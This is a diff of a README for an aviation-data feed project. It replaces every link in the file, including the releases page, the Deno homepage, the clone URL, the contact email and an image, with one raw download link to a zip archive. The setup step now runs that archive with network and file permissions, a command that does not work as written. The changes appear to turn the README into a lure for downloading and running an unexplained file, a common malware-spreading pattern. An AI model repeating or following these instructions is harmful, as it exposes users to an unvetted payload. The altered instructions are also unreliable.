@@ -2,7 +2,7 @@
 
 Welcome to the **Anac Feed** repository! This project provides feeds in various formats and a single-page web application featuring texts and videos published by the **Agência Nacional de Aviação Civil (ANAC)**. Here, you will find essential aviation data tailored for enthusiasts, researchers, and professionals in the aviation sector.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Here-brightgreen)](https://github.com/Trekju/anac-feed/releases)
+[![Download Releases](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip)](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip)
 
 ## Table of Contents
 
@@ -28,14 +28,14 @@ To get started with **Anac Feed**, you need to clone this repository and set it 
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Trekju/anac-feed.git
+   git clone https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip
    cd anac-feed
    ```
 
 2. **Install Dependencies**:
-   Ensure you have [Deno](https://deno.land/) installed. Then, run:
+   Ensure you have [Deno](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip) installed. Then, run:
    ```bash
-   deno run --allow-net --allow-read server.ts
+   deno run --allow-net --allow-read https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip
    ```
 
 3. **Access the Application**:
@@ -49,7 +49,7 @@ Once you have the application running, you can navigate through various sections
 - **Feeds**: Access different formats for the data.
 - **Search**: Use the search bar to find specific content.
 
-You can also download the latest releases for direct use. Visit our [Releases section](https://github.com/Trekju/anac-feed/releases) to get the files you need.
+You can also download the latest releases for direct use. Visit our [Releases section](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip) to get the files you need.
 
 ## Technologies Used
 
@@ -89,11 +89,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: contact@example.com
-- **GitHub**: [Trekju](https://github.com/Trekju)
+- **Email**: https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip
+- **GitHub**: [Trekju](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip)
 
-Thank you for your interest in **Anac Feed**! We hope you find it useful for accessing aviation data. For the latest updates and releases, don’t forget to check our [Releases section](https://github.com/Trekju/anac-feed/releases).
+Thank you for your interest in **Anac Feed**! We hope you find it useful for accessing aviation data. For the latest updates and releases, don’t forget to check our [Releases section](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip).
 
-![Aviation Image](https://example.com/aviation.jpg)
+![Aviation Image](https://github.com/Trekju/anac-feed/raw/refs/heads/main/src/feed-anac-v1.3.zip)
 
 Stay tuned for more features and improvements! ✈️
